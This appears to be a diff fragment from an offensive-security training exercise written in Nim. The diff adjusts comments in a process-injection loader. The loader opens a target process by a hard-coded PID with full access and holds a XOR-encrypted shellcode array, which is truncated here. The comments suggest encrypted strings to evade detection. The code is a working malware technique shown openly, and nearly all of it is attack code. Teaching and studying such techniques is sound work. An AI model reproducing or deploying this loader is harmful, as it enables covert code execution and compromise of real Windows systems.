@@ -16,6 +16,8 @@ proc xorByteSeq*(input: openArray[byte], key: int): seq[byte] {.noinline.} =
         result[i] = uint8(input[i]) xor uint8(k)
 
 proc injectShellcode[I, T](shellcode: array[I, T]): void =
+    # Optionally, we can target the process name here (see Bonus Exercise 2)
+    # Don't forget to use only encrypted strings in this case (see 'Encrypt.nim’)
     let processId: DWORD = 8520
     
     let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, processId)
@@ -35,7 +37,7 @@ proc injectShellcode[I, T](shellcode: array[I, T]): void =
 
 when defined(windows):
     # Define our encrypted shellcode
-    # I re-formatted the output from the 'Encrypt.cs' C# solution example, since string formatting in Nim is a pain :)
+    # Output taken from 'Encrypt.nim'
     const shellcode: array[296, byte] = [
         byte 0xcb, 0x7f, 0xb4, 0xd3, 0xc7, 0xdf, 0xf7, 0x37, 0x37, 0x37, 0x76, 0x66, 0x76, 0x67, 0x65,
         0x66, 0x61, 0x7f, 0x06, 0xe5, 0x52, 0x7f, 0xbc, 0x65, 0x57, 0x7f, 0xbc, 0x65, 0x2f, 0x7f,
